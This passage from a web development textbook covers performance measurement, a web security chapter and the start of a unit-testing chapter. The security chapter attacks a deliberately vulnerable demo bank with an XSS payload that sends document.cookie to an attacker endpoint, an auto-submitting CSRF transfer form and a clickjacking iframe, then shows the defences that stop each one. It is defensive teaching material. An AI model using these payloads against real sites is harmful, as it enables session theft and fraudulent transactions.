    img { display: block; max-width: 100%; height: auto; }
    #banner-slot { min-height: 3.2rem; }                       /* reserve the banner's space */
    .banner { background: gold; padding: 1rem; }
  </style>
  <script defer src="/fast/app.js"></script>                   <!-- runs after parsing, does not block it -->
</head>
<body>
  <h1>Spring collection</h1>
  <div id="banner-slot"></div>
  <img src="/img/hero-small.png" width="600" height="375" fetchpriority="high" alt="The spring collection">
  <p>Fresh colours for a new season.</p>
  <button id="filter">Filter products</button>
  <ul><li>Product 1: linen shirt, $21.00</li><li>Product 2: linen shirt, $22.00</li><li>Product 3: linen shirt, $23.00</li><li>Product 4: linen shirt, $24.00</li><li>Product 5: linen shirt, $25.00</li><li>Product 6: linen shirt, $26.00</li><li>Product 7: linen shirt, $27.00</li><li>Product 8: linen shirt, $28.00</li><li>Product 9: linen shirt, $29.00</li><li>Product 10: linen shirt, $30.00</li></ul>
</body>
</html>
```

```js
// file: project/fast/app.js
const busy = (ms) => { const end = performance.now() + ms; while (performance.now() < end) {} };
requestIdleCallback(() => busy(150));                        // non-urgent initialisation, when the browser is idle
setTimeout(() => {
  const b = Object.assign(document.createElement("div"), { className: "banner", textContent: "Free shipping this week!" });
  document.getElementById("banner-slot").append(b);         // fills space that was already reserved
}, 1000);
document.getElementById("filter").addEventListener("click", async () => {
  const button = document.getElementById("filter");
  button.textContent = "Filtering…";                         // immediate feedback, painted at the next frame
  await scheduler.yield();
  for (let i = 0; i < 15; i++) { busy(20); await scheduler.yield(); }   // the same 300 ms of work, in slices
  button.textContent = "Filtered";
});
```

```console
$ cd project && node make-images.mjs
wrote img/hero-big.png and img/hero-small.png
$ cd project && for v in slow fast; do echo "== $v"; python3 ../../tools/page.py http://localhost:8120/$v/ wait:6000 click:#filter wait:600 "eval:reportVitals()" "eval:layoutShifts()" --serve "node server.mjs" --slow; done
== slow
=> "FCP 1248 ms, LCP 5968 ms, CLS 0.041, slowest interaction 320 ms, transferred 1991 KiB"
=> ["2248 ms: 0.041 (IMG moved 52px, UL moved 52px, P moved 52px, BUTTON moved 52px)"]
== fast
=> "FCP 900 ms, LCP 2136 ms, CLS 0.000, slowest interaction 16 ms, transferred 501 KiB"
=> []
```

The numbers, slow page against fast page:

- **LCP** falls from about 6 s to about 2 s: the hero image is a quarter of the bytes and starts downloading immediately instead of after the stylesheet and script.
- **FCP** improves by about 400 ms: nothing blocks the first render any more.
- **CLS** falls from 0.04 to 0: the only shift in the slow page was the late banner, which pushed the image, the button, and the list down by 52 px; in the fast page, the banner fills space reserved for it.
- **The slowest interaction** falls from over 300 ms to under 20 ms: the same 300 ms of work still happens, but the browser can paint "Filtering…" and handle other input between the slices.
- **Bytes transferred** fall by three quarters, almost all from the image.

Notice what did *not* produce a shift: the hero image without `width` and `height`. Its dimensions arrived (in the first bytes of the PNG) before the first paint, so the browser laid it out correctly from the start. On a different network the same markup can shift the whole page — which is why the attributes are required, even though this measurement could not show the difference.

### Deep & Tricky

**DT-39. DevTools-style network throttling — used by this chapter's `--slow` option and by Lighthouse's "simulated" modes — adds the latency to each response as a whole, so navigation timing shows a fast `responseStart` (time to first byte) and a slow `responseEnd`; it also does not model TCP slow start, connection limits, or packet loss. Throttled lab numbers are useful for comparing two versions of a page, not as predictions of what users will see.** *(Chrome DevTools documentation, "Throttling" — request-level throttling; Lighthouse documentation, "Network throttling": "simulated throttling… applied after the fact")* The first version of `vitals.js` reported a time to first byte of 5 ms under a 400-ms latency, which is how this was noticed.

### Review checklist

- The fast page's banner slot is 3.2 rem high. What happens to CLS if the banner text wraps to two lines on a narrow phone?
- Convert the hero image to AVIF or WebP (for example with `sharp`). How much more does LCP improve?
- Move the 150-ms initialisation to a Web Worker. What can, and cannot, move?

## Answers to the Chapter 13 prediction questions

**Unit 13.1, Q1.** An average hides the slow tail: most users can be fast while a quarter have a poor experience; the 75th percentile requires that at least three quarters of visits are good, and is less sensitive to a few extreme outliers than a higher percentile.

**Unit 13.4, Q1.** LCP gets worse: lazy images are fetched only after layout shows them near the viewport, so the download starts later than if the preload scanner had found it in the HTML.

# Chapter 14 — Web Security: XSS, CSRF, CSP, and Friends

*Goal: understand the attacks that matter most on the web and the defences that actually stop them, by attacking a deliberately vulnerable application and then hardening it. You will see cross-site scripting run code in a victim's page and steal a session, a cross-site request transfer money from a logged-in user, a framed page set up for clickjacking — and then output escaping, a nonce-based Content Security Policy, Trusted Types, `SameSite` cookies, CSRF tokens, `frame-ancestors`, and Subresource Integrity stop each one, measured attack by attack.*

**What you will be able to do after this chapter**

- Explain the browser's security model: origins, sites, and what each protects.
- Prevent XSS by construction: safe sinks, contextual escaping, CSP, and Trusted Types.
- Prevent CSRF with `SameSite` cookies and tokens, and clickjacking with `frame-ancestors`.
- Protect sessions with cookie attributes, and third-party code with Subresource Integrity.
- Test an application's defences with real attacks.

## Topic 14A — The model

## Unit 14.1 — Origins and sites

**One-line summary:** The *origin* (scheme + host + port) is the boundary for reading data — the same-origin policy and CORS (Chapter 11) — while the *site* (scheme + registrable domain, such as `https://example.com`, ignoring subdomains and port) is the boundary for cookies' `SameSite` rule and several isolation features; most web attacks consist of one site getting the browser to act, with the user's credentials, against another.

| URL pair | Same origin? | Same site? |
| --- | --- | --- |
| `https://a.example.com` and `https://b.example.com` | no | yes |
| `http://localhost:8130` and `http://localhost:8131` | no | yes |
| `http://localhost:8130` and `http://127.0.0.1:8131` | no | **no** |
| `https://example.com` and `http://example.com` | no | no (scheme differs) |

That is why the attacker in this chapter's project lives at `127.0.0.1`: on another port of `localhost` it would be *same-site*, and `SameSite` cookies would not protect against it.

### Deep & Tricky

**DT-40. `SameSite` cookies stop requests from other *sites*, not other origins: a vulnerable page on any subdomain of your registrable domain (`blog.example.com`, an old marketing microsite, a user-content host) is same-site with `app.example.com`, so its requests carry `SameSite=Strict` cookies, and an XSS bug there can drive the main application. User-generated content belongs on a separate registrable domain (as `googleusercontent.com` and `githubusercontent.com` are), not a subdomain.** *(RFC 6265bis §5.2 "Same-site and cross-site requests"; HTML Living Standard §7.1.1 "Sites"; Public Suffix List)*

## Topic 14B — Injection

## Unit 14.2 — Cross-site scripting

**One-line summary:** XSS happens when data from an attacker is interpreted as code in a victim's page — through an HTML-parsing sink (`innerHTML`, `document.write`), an event-handler attribute, or a `javascript:` URL — and then runs with the page's full authority: reading its data, calling its APIs with the user's cookies, and rewriting what the user sees.

```html
<!-- file: xss/search.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>Search</title></head>
<body>
  <p id="unsafe"></p>
  <p id="safe"></p>
  <a id="profile">Your website</a>
  <script>
    // The search term comes from the URL — that is, from whoever wrote the link the user clicked.
    const q = new URLSearchParams(location.search).get("q") ?? "";
    try { document.getElementById("unsafe").innerHTML = `Results for ${q}`; }       // parses q as HTML
    catch (e) { console.log(`innerHTML refused: ${e.name}: ${e.message.slice(0, 80)}`); }
    document.getElementById("safe").textContent = `Results for ${q}`;                // q stays text
    const site = new URLSearchParams(location.search).get("site") ?? "";
    // Escaping HTML is not enough for URLs: a javascript: URL runs code when clicked.
    const ok = /^https?:\/\//i.test(site);
    document.getElementById("profile").href = ok ? site : "#";
    console.log(`profile link: ${ok ? site : "rejected " + JSON.stringify(site)}`);
    console.log(`unsafe paragraph contains ${document.getElementById("unsafe").children.length} element(s)`);
  </script>
</body>
</html>
```

```js
// file: xss/server.mjs
// Serves search.html twice: at /open/ with no protection, at /csp/ with a Content Security Policy
// that allows only scripts carrying the page's nonce and requires Trusted Types for HTML sinks.
import http from "node:http";
import { readFile } from "node:fs/promises";
import { randomBytes } from "node:crypto";

http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  const nonce = randomBytes(16).toString("base64");
  let html = (await readFile("search.html", "utf8")).replace("<script>", `<script nonce="${nonce}">`);
  const headers = { "Content-Type": "text/html; charset=utf-8" };
  if (url.pathname.startsWith("/csp/"))
    headers["Content-Security-Policy"] = `script-src 'nonce-${nonce}'; object-src 'none'; base-uri 'none'; ` +
                                         `require-trusted-types-for 'script'`;
  res.writeHead(200, headers).end(html);
}).listen(8132);
```

The attacker's link puts an image tag with an `onerror` handler into the `q` parameter:

```console
$ cd xss && python3 ../../tools/page.py "http://localhost:8132/open/?q=%3Cimg%20src%3Dx%20onerror%3D%22console.log(%60XSS%20RAN%3A%20cookie%20%24%7Bdocument.cookie%7D%60)%22%3E&site=javascript:alert(1)" wait:300 --serve "node server.mjs"
profile link: rejected "javascript:alert(1)"
unsafe paragraph contains 1 element(s)
XSS RAN: cookie 
```

The `innerHTML` assignment created an `<img>` element, its load failed, and the handler ran the attacker's code (here it only logs; a real one would send `document.cookie`, or act as the user). The same text put through `textContent` is harmless. The profile link shows that escaping HTML is not enough everywhere: a URL must be checked for its scheme, because a `javascript:` URL contains no HTML special characters at all.

### Mastery check

1. **Predict.** Is `el.innerHTML = "<script>alert(1)</script>"` an XSS hole?

### Deep & Tricky

**DT-41. Escaping depends on context: HTML-escaping (`&lt;`) is right for text between tags and inside quoted attributes, but not for unquoted attributes, URLs (`javascript:`), CSS, or JavaScript strings inside `<script>` — where `</script>` in the data ends the script block whatever JSON escaping was applied. Frameworks and template engines that escape by default (and the DOM's `textContent` and `setAttribute`) are safe for the contexts they understand; every "raw HTML" escape hatch — `innerHTML`, React's `dangerouslySetInnerHTML`, Vue's `v-html` — needs a sanitiser such as DOMPurify.** *(OWASP "Cross Site Scripting Prevention Cheat Sheet", rules 1–7 by output context; HTML Living Standard §4.12.1.3 "Restrictions for contents of script elements")*

## Unit 14.3 — Content Security Policy and Trusted Types

**One-line summary:** A Content Security Policy header tells the browser which scripts may run — with `script-src 'nonce-…'`, only `<script>` elements carrying a fresh random nonce, so injected markup and inline event handlers cannot execute — and `require-trusted-types-for 'script'` makes HTML-parsing sinks such as `innerHTML` refuse plain strings, turning would-be XSS into an exception you can find.

```console
$ cd xss && python3 ../../tools/page.py "http://localhost:8132/csp/?q=%3Cimg%20src%3Dx%20onerror%3D%22console.log(%60XSS%20RAN%3A%20cookie%20%24%7Bdocument.cookie%7D%60)%22%3E&site=javascript:alert(1)" wait:300 --serve "node server.mjs"
This document requires 'TrustedHTML' assignment. The action has been blocked.
innerHTML refused: TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'Tru
profile link: rejected "javascript:alert(1)"
unsafe paragraph contains 0 element(s)
```

The same page, the same malicious link: the `innerHTML` assignment now throws, and the paragraph contains no elements. Even without Trusted Types, the nonce-based policy would have blocked the `onerror` handler, because inline handlers carry no nonce. CSP is a second line of defence — it limits the damage of an injection bug — not a reason to stop escaping.

## Unit 14.4 — Cross-site request forgery and clickjacking

**One-line summary:** CSRF makes a victim's browser send a state-changing request to a site where they are logged in — a form on the attacker's page auto-submits, and the browser attaches the cookies — and is stopped by `SameSite=Lax` or `Strict` session cookies plus a secret per-session token that the attacker cannot read; clickjacking frames your page invisibly under a decoy, and is stopped by `Content-Security-Policy: frame-ancestors 'none'` (or `X-Frame-Options: DENY`).

Both are demonstrated in the project.

### Mastery check

1. **Explain.** Why can the attacker's page not simply read the CSRF token from the bank's form and include it?

## Unit 14.5 — Third-party code and Subresource Integrity

**One-line summary:** Every script a page includes runs with the page's full authority, so a compromised CDN or npm package is an XSS hole you installed yourself; Subresource Integrity (`integrity="sha384-…"`) makes the browser refuse a file whose content differs from the hash you reviewed, and lockfiles plus `npm audit` do the same job for build-time dependencies.

```js
// file: sri/lib.js
console.log("lib.js ran: the version we reviewed");
```

```js
// file: sri/make-page.mjs
// Writes page.html with a Subresource Integrity hash of lib.js as it is now.
import { readFileSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
const hash = createHash("sha384").update(readFileSync("lib.js")).digest("base64");
writeFileSync("page.html", `<!DOCTYPE html><title>SRI</title>
<script src="lib.js" integrity="sha384-${hash}" crossorigin="anonymous"></script>
<script>addEventListener("load", () => console.log("page loaded"));</script>\n`);
console.log(`integrity="sha384-${hash.slice(0, 20)}…"`);
```

```console
$ cd sri && node make-page.mjs && python3 ../../tools/page.py http://localhost:8133/page.html --serve "node ../../ch00/project/static.mjs . 8133"
integrity="sha384-D2EjsoZKW1VMJedAG2/x…"
lib.js ran: the version we reviewed
page loaded
$ cd sri && echo 'console.log("lib.js ran: COMPROMISED");' >> lib.js && python3 ../../tools/page.py http://localhost:8133/page.html --serve "node ../../ch00/project/static.mjs . 8133"
Failed to find a valid digest in the 'integrity' attribute for resource 'http://localhost:8133/lib.js' with computed SHA-384 integrity '/JpRc3Sj9JfSf1hCUmJ1jqEMLwprvzw/78CAZONOc/leqRgHH6KRz32c+0BYgDmi'. The resource has been blocked.
page loaded
```

After one line was appended to the file on the "CDN", the browser refused to run it. The `crossorigin` attribute is required for cross-origin files, so that the browser may read the bytes to hash them.

## Chapter 14 Project — Attack and harden a web application

### Requirements

A small bank with a guestbook has three vulnerabilities: comments are inserted into the page unescaped (stored XSS), the transfer form has no CSRF protection and the session cookie is sent cross-site, and the page can be framed. Write the attacker's site and an attack script that runs all three attacks as a logged-in victim. Then add a `SECURE` mode that fixes them: HTML escaping, a nonce-based CSP with Trusted Types and `frame-ancestors 'none'`, an `HttpOnly; SameSite=Lax` session cookie, and a per-session CSRF token compared in constant time. Run the attacks against both modes.

### Reference solution

```js
// file: project/bank.mjs
// A deliberately vulnerable little bank with a guestbook, at http://localhost:8130.
// Run with SECURE=1 for the hardened version: every difference is marked "if (SECURE)".
import http from "node:http";
import { randomBytes, timingSafeEqual } from "node:crypto";

const SECURE = process.env.SECURE === "1";
const sessions = new Map();                       // session id -> { user, csrf }
const comments = ["Great bank!"];
let balance = 1000;

const escapeHtml = (s) => s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
const cookies = (req) => Object.fromEntries((req.headers.cookie ?? "").split(/;\s*/).filter(Boolean).map((c) => c.split("=")));
const body = async (req) => { let b = ""; for await (const c of req) b += c; return new URLSearchParams(b); };
const same = (a, b) => a.length === b.length && timingSafeEqual(Buffer.from(a), Buffer.from(b));

http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  const session = sessions.get(cookies(req).sid);
  const nonce = randomBytes(16).toString("base64");
  const headers = { "Content-Type": "text/html; charset=utf-8" };
  if (SECURE) Object.assign(headers, {
    "Content-Security-Policy": `default-src 'self'; script-src 'nonce-${nonce}'; object-src 'none'; ` +
      `base-uri 'none'; frame-ancestors 'none'; require-trusted-types-for 'script'`,
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "same-origin",
  });

  if (url.pathname === "/login") {                // log in as "ana" (no password: this is about sessions)
    const sid = randomBytes(16).toString("hex");
    sessions.set(sid, { user: "ana", csrf: randomBytes(16).toString("hex") });
    const attrs = SECURE ? "HttpOnly; SameSite=Lax; Path=/" : "SameSite=None; Secure; Path=/";
    res.writeHead(302, { "Set-Cookie": `sid=${sid}; ${attrs}`, Location: "/" });
    return res.end();
  }
  if (url.pathname === "/comment" && req.method === "POST") {
    comments.push((await body(req)).get("text") ?? "");
    res.writeHead(303, { Location: "/" });
    return res.end();
  }
  if (url.pathname === "/transfer" && req.method === "POST") {
    const form = await body(req);
    if (!session) { res.writeHead(401); return res.end("not logged in"); }
    if (SECURE && !same(form.get("csrf") ?? "", session.csrf)) { res.writeHead(403); return res.end("bad CSRF token"); }
    balance -= Number(form.get("amount"));
    console.log(`  bank: TRANSFER of ${form.get("amount")} to ${form.get("to")} for ${session.user}; balance ${balance}`);
    res.writeHead(303, { Location: "/" });
    return res.end();
  }
  if (url.pathname === "/") {
    const list = comments.map((c) => `<li>${SECURE ? escapeHtml(c) : c}</li>`).join("");
    res.writeHead(200, headers);
    return res.end(`<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Bank</title></head><body>
      <p>${session ? `Logged in as ${session.user}. Balance: ${balance}` : "Not logged in"}</p>
      <form method="post" action="/transfer">
        <input name="to"><input name="amount" type="number">
        ${SECURE && session ? `<input type="hidden" name="csrf" value="${session.csrf}">` : ""}
        <button>Transfer</button></form>
      <h2>Guestbook</h2><ul id="comments">${list}</ul>
      <form method="post" action="/comment"><input name="text"><button>Post</button></form>
      <script nonce="${nonce}">
        console.log("bank page loaded" + (window.top !== window ? " INSIDE A FRAME" : ""));
      </script></body></html>`);
  }
  res.writeHead(404).end();
}).listen(8130, () => console.log(`  bank: listening (SECURE=${SECURE ? 1 : 0})`));
```

```js
// file: project/evil.mjs
// The attacker's site, on a DIFFERENT SITE (127.0.0.1, not localhost): it logs stolen data and
// serves pages that attack the bank.
import http from "node:http";

http.createServer((req, res) => {
  const url = new URL(req.url, "http://x");
  if (url.pathname === "/steal") {
    console.log(`  evil: STOLE ${url.searchParams.get("c") || "(nothing)"}`);
    return res.writeHead(204).end();
  }
  res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  if (url.pathname === "/csrf") return res.end(`<!DOCTYPE html><title>Win a prize</title>
    <form id="f" method="post" action="http://localhost:8130/transfer">
      <input name="to" value="mallory"><input name="amount" value="900"></form>
    <script>document.getElementById("f").submit();</script>`);
  if (url.pathname === "/frame") return res.end(`<!DOCTYPE html><title>Free game</title>
    <p>Click the button to play!</p>
    <iframe src="http://localhost:8130/" style="opacity: 0.01; position: absolute; top: 0"></iframe>`);
  res.end("evil");
}).listen(8131, () => console.log("  evil: listening"));
```

```bash
# file: project/attack.sh
# Runs the three attacks against the bank, as a logged-in victim would experience them.
P="python3 ../../tools/page.py"
PAYLOAD='<img src=x onerror="new Image().src=`http://127.0.0.1:8131/steal?c=`+document.cookie">'
echo "--- 1. CSRF: the logged-in victim visits the attacker's page"
$P http://localhost:8130/login "eval:void (location.href = 'http://127.0.0.1:8131/csrf')" wait:800
echo "--- 2. clickjacking: the attacker frames the bank"
$P http://localhost:8130/login "eval:void (location.href = 'http://127.0.0.1:8131/frame')" wait:800
echo "--- 3. stored XSS: the attacker posts a comment, the victim views the guestbook"
$P http://localhost:8130/login "fill:input[name=text]|$PAYLOAD" "click:text=Post" wait:500 "eval:document.getElementById('comments').lastElementChild.innerHTML"
```

```console
$ cd project && { node bank.mjs & B=$!; node evil.mjs & E=$!; sleep 0.5; bash attack.sh; kill $B $E; }
  evil: listening
  bank: listening (SECURE=0)
--- 1. CSRF: the logged-in victim visits the attacker's page
bank page loaded
=> null
  bank: TRANSFER of 900 to mallory for ana; balance 100
bank page loaded
--- 2. clickjacking: the attacker frames the bank
bank page loaded
=> null
bank page loaded INSIDE A FRAME
--- 3. stored XSS: the attacker posts a comment, the victim views the guestbook
bank page loaded
Failed to load resource: the server responded with a status of 404 (Not Found)
bank page loaded
  evil: STOLE sid=11811764f01a34d081e9059107432dc9
=> "<img src=\"x\" onerror=\"new Image().src=`http://127.0.0.1:8131/steal?c=`+document.cookie\">"
$ cd project && { SECURE=1 node bank.mjs & B=$!; node evil.mjs & E=$!; sleep 0.5; bash attack.sh; kill $B $E; }
  bank: listening (SECURE=1)
  evil: listening
--- 1. CSRF: the logged-in victim visits the attacker's page
bank page loaded
=> null
Failed to load resource: the server responded with a status of 401 (Unauthorized)
--- 2. clickjacking: the attacker frames the bank
bank page loaded
=> null
Framing 'http://localhost:8130/' violates the following Content Security Policy directive: "frame-ancestors 'none'". The request has been blocked.

--- 3. stored XSS: the attacker posts a comment, the victim views the guestbook
bank page loaded
bank page loaded
=> "&lt;img src=x onerror=\"new Image().src=`http://127.0.0.1:8131/steal?c=`+document.cookie\"&gt;"
```

Against the vulnerable bank, all three attacks work: the attacker's page made the victim's browser transfer 900, the bank rendered inside the attacker's frame, and the stored comment sent the session cookie to the attacker's server — enough to impersonate the victim. Against the hardened bank, the cross-site POST arrives without the session cookie (`SameSite=Lax` cookies are not sent on cross-site POSTs), so the bank answers 401 and never even reaches the token check; the frame is refused by `frame-ancestors`; and the comment is stored but rendered as text — the final `eval` shows the escaped markup. Even if an escaping bug slipped through, the CSP would refuse the inline handler, and `HttpOnly` would keep the cookie out of `document.cookie`.

### Pattern

**P-13. Defence in depth for every web application: escape by default in the template layer, a strict nonce-based CSP (with Trusted Types where possible), session cookies `__Host-` prefixed, `HttpOnly`, `Secure`, `SameSite=Lax`, CSRF tokens on state-changing requests, `frame-ancestors 'none'` unless framing is needed, HTTPS with HSTS, server-side validation of every input, and dependency hygiene (lockfiles, audits, SRI).** *(OWASP Application Security Verification Standard 4.0, V3, V5, V14; MDN "Web security")* *Trade-off:* a strict CSP forbids inline scripts and `eval`, which some third-party widgets and older libraries require; adopt it with `Content-Security-Policy-Report-Only` first and fix what it reports.

### Review checklist

- The CSRF token is compared with `timingSafeEqual`. What could an attacker learn from an ordinary `===` comparison, and how plausible is that over a network?
- The hardened cookie lacks `Secure` because the demo uses plain HTTP; what else changes in production (HSTS, `__Host-` prefix)?
- The guestbook still accepts any text. Should the *server* reject HTML in comments, or store it and escape on output? Why do most systems choose the latter?

## Answers to the Chapter 14 prediction questions

**Unit 14.2, Q1.** Not by itself — scripts inserted through `innerHTML` do not execute (DT-27) — but the same sink with `<img src=x onerror=…>` does run code, so any untrusted string in `innerHTML` is a hole.

**Unit 14.4, Q1.** Reading the bank's page from another origin is exactly what the same-origin policy forbids: the attacker can make the browser *send* requests to the bank, but cannot read the responses, so the token stays secret.

# Chapter 15 — Testing

*Goal: write tests that find bugs and keep finding them. You will use Node.js's built-in test runner for unit tests, discover that a 100%-coverage suite can still miss a bug that one property-style test exposes, make time and the network deterministic with fake timers and mocks, and write end-to-end tests that drive a real browser through the accessibility tree, the way users and assistive technology experience the page. The project is an end-to-end suite for Chapter 8's autocomplete component.*

**What you will be able to do after this chapter**

- Write and organise unit tests with `node:test` and `node:assert`, including table-driven tests.
- Use coverage as a guide, and know what it cannot tell you.
- Replace time, network, and other dependencies with test doubles.
- Write end-to-end tests with Playwright Test using role-based locators and web-first assertions.
- Choose what to test at which level.

## Topic 15A — Unit tests

## Unit 15.1 — The built-in test runner

**One-line summary:** Node.js includes a test runner — `node --test` finds files named `*.test.js` (and similar), runs their `describe`/`it` (or `test`) blocks in parallel processes, and reports with a choice of reporters — and `node:assert/strict` provides the assertions, so small projects need no test framework at all.

```js
// file: unit/duration.js
// Parses durations such as "1h30m", "45s", "2h" into milliseconds.
const UNITS = { h: 3_600_000, m: 60_000, s: 1_000, ms: 1 };

export function parseDuration(text) {
  if (typeof text !== "string" || !text.trim()) throw new TypeError("duration must be a non-empty string");
  let total = 0, rest = text.trim().toLowerCase();
  const part = /^(\d+(?:\.\d+)?)(ms|h|m|s)/;
  while (rest) {
    const m = part.exec(rest);
    if (!m) throw new SyntaxError(`invalid duration: ${JSON.stringify(text)}`);
    total += Number(m[1]) * UNITS[m[2]];
    rest = rest.slice(m[0].length);
  }
  return total;
}

export function formatDuration(ms) {
  const parts = [];
  for (const [unit, size] of Object.entries(UNITS)) {
    if (ms >= size || (unit === "ms" && parts.length === 0)) {
      parts.push(`${Math.floor(ms / size)}${unit}`);
      ms %= size;
    }
  }
  return parts.join("");
}
```

```js
// file: unit/duration.test.js
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { parseDuration, formatDuration } from "./duration.js";

describe("parseDuration", () => {
  it("parses single units", () => {
    assert.equal(parseDuration("45s"), 45_000);
    assert.equal(parseDuration("2h"), 7_200_000);
    assert.equal(parseDuration("250ms"), 250);
  });
  it("parses combinations and decimals", () => {
    assert.equal(parseDuration("1h30m"), 5_400_000);
    assert.equal(parseDuration("1.5s"), 1_500);
  });
  it("rejects nonsense with a useful message", () => {
    assert.throws(() => parseDuration("10 minutes"), { name: "SyntaxError", message: /invalid duration/ });
    assert.throws(() => parseDuration(""), TypeError);
  });
  for (const [text, ms] of [["1m", 60_000], ["1m1s", 61_000], ["0s", 0]])     // table-driven cases
    it(`"${text}" is ${ms} ms`, () => assert.equal(parseDuration(text), ms));
});

describe("formatDuration", () => {
  it("is the inverse of parseDuration", () => {
    for (const text of ["1h30m", "45s", "2h5m3s", "250ms"])
      assert.equal(formatDuration(parseDuration(text)), text);
  });
  it("formats zero", () => assert.equal(formatDuration(0), "0ms"));
});
```

```console
$ npm init -y > /dev/null && npm pkg set type=module && npm install --save-dev @playwright/test@1.63 2>&1 | tail -1
found 0 vulnerabilities
$ cd unit && node --test --test-reporter=spec duration.test.js
▶ parseDuration
  ✔ parses single units (0.575966ms)
  ✔ parses combinations and decimals (1.019408ms)
  ✔ rejects nonsense with a useful message (0.655038ms)
  ✔ "1m" is 60000 ms (0.167426ms)
  ✔ "1m1s" is 61000 ms (0.154005ms)
  ✔ "0s" is 0 ms (0.052043ms)
✔ parseDuration (3.374741ms)
▶ formatDuration
  ✔ is the inverse of parseDuration (0.229866ms)
  ✔ formats zero (0.125522ms)
✔ formatDuration (0.508329ms)
ℹ tests 8
ℹ suites 2
ℹ pass 8
ℹ fail 0
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 59.410689
```

`assert.throws` checks both the error type and the message pattern, so a test cannot pass because the function threw the *wrong* error. The `for` loop generates one named test per row of a table — cheap to extend when a bug report brings a new case.

### Mastery check

1. **Predict.** A test calls `assert.equal(parseDuration("1h"), "3600000")`. Does it pass?

## Unit 15.2 — Coverage, and what it does not measure

**One-line summary:** Coverage reports which lines, branches, and functions the tests executed, which is useful for finding untested code — but executing a line is not checking it, and a suite can reach 100% while missing a whole class of inputs; tests that state *properties* ("for every valid x, format(parse(x)) = x") over many inputs find what hand-picked examples miss.

```console
$ cd unit && node --test --experimental-test-coverage --test-reporter=spec duration.test.js 2>&1 | grep -E "^ℹ (file|duration|all)"
ℹ duration_ms 68.255107
ℹ file             | line % | branch % | funcs % | uncovered lines
ℹ duration.js      | 100.00 |   100.00 |  100.00 | 
ℹ duration.test.js | 100.00 |   100.00 |  100.00 | 
ℹ all files        | 100.00 |   100.00 |  100.00 | 
```

Every line and branch of `duration.js` was executed. Now one more test, stating the round-trip property more broadly:

```js
// file: unit/roundtrip.test.js
// A test that states a property more broadly than the examples above did — and finds a gap.
import { it } from "node:test";
import assert from "node:assert/strict";
import { parseDuration, formatDuration } from "./duration.js";

it("format(parse(x)) gives back x for every valid duration", () => {
  for (const text of ["1h30m", "90s", "45s"]) assert.equal(formatDuration(parseDuration(text)), text);
});
```

```console
$ cd unit && node --test --test-reporter=spec roundtrip.test.js
✖ format(parse(x)) gives back x for every valid duration (1.233766ms)
ℹ tests 1
ℹ suites 0
ℹ pass 0
ℹ fail 1
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 47.801502

✖ failing tests:

test at roundtrip.test.js:7:1
✖ format(parse(x)) gives back x for every valid duration (1.233766ms)
  AssertionError [ERR_ASSERTION]: Expected values to be strictly equal:
  
  '1m30s' !== '90s'
  
      at TestContext.<anonymous> (file://unit/roundtrip.test.js:8:54)
      at Test.runInAsyncScope (node:async_hooks:214:14)
      at Test.run (node:internal/test_runner/test:1047:25)
      at Test.start (node:internal/test_runner/test:944:17)
      at startSubtestAfterBootstrap (node:internal/test_runner/harness:296:17) {
    generatedMessage: true,
    code: 'ERR_ASSERTION',
    actual: '1m30s',
    expected: '90s',
    operator: 'strictEqual',
    diff: 'simple'
  }
```

"90s" is a valid duration, but formatting normalises it to "1m30s". Whether that is a bug in `formatDuration` or in the property is a design decision — but the 100%-coverage suite never raised the question. Property-based testing libraries (fast-check for JavaScript) generate hundreds of random inputs for such properties and shrink a failure to the smallest example.

### Deep & Tricky

**DT-42. Line and branch coverage measure which code ran, not which behaviour was checked: a test with no assertions gets the same coverage as a thorough one, and code reached with only "happy" inputs is fully covered while its edge cases are untested. Mutation testing (Stryker for JavaScript) measures the suite instead — it changes the code (`<` to `<=`, `+` to `-`) and reports mutations that no test notices.** *(Node.js documentation, "Test runner — Collecting code coverage"; Inozemtseva & Holmes, "Coverage is not strongly correlated with test suite effectiveness", ICSE 2014)*

## Unit 15.3 — Test doubles: fake time, fake network

**One-line summary:** Tests must be fast and deterministic, so code that waits for timers or talks to networks is tested with doubles: spies that record calls (`mock.fn`), replaced methods (`mock.method`, here a fake `fetch`), and fake timers (`mock.timers`) that advance time instantly — turning a 300-ms debounce test into one that takes two milliseconds and never flakes.

```js
// file: unit/debounce.js
/** Call fn only after `wait` ms have passed without another call (e.g. search-as-you-type). */
export function debounce(fn, wait) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), wait);
  };
}
```

```js
// file: unit/debounce.test.js
// Fake timers make time-based code testable in microseconds, deterministically.
import { it, mock } from "node:test";
import assert from "node:assert/strict";
import { debounce } from "./debounce.js";

it("calls once, with the last arguments, after the quiet period", (t) => {
  t.mock.timers.enable({ apis: ["setTimeout"] });
  const search = t.mock.fn();                          // a spy: records its calls
  const debounced = debounce(search, 300);
  debounced("c"); t.mock.timers.tick(100);
  debounced("ca"); t.mock.timers.tick(100);
  debounced("cat");
  t.mock.timers.tick(299);
  assert.equal(search.mock.callCount(), 0);            // still inside the quiet period
  t.mock.timers.tick(1);
  assert.equal(search.mock.callCount(), 1);
  assert.deepEqual(search.mock.calls[0].arguments, ["cat"]);
});

it("a mocked fetch: the code under test never touches the network", async (t) => {
  t.mock.method(globalThis, "fetch", async (url) => new Response(JSON.stringify({ url, hits: 3 })));
  const res = await fetch("https://api.example.com/search?q=cat");
  assert.deepEqual(await res.json(), { url: "https://api.example.com/search?q=cat", hits: 3 });
  assert.equal(globalThis.fetch.mock.callCount(), 1);
});
```

```console
$ cd unit && node --test --test-reporter=spec debounce.test.js
(node:16705) ExperimentalWarning: The MockTimers API is an experimental feature and might change at any time
(Use `node --trace-warnings ...` to show where the warning was created)
✔ calls once, with the last arguments, after the quiet period (1.544817ms)
✔ a mocked fetch: the code under test never touches the network (16.714427ms)
ℹ tests 2
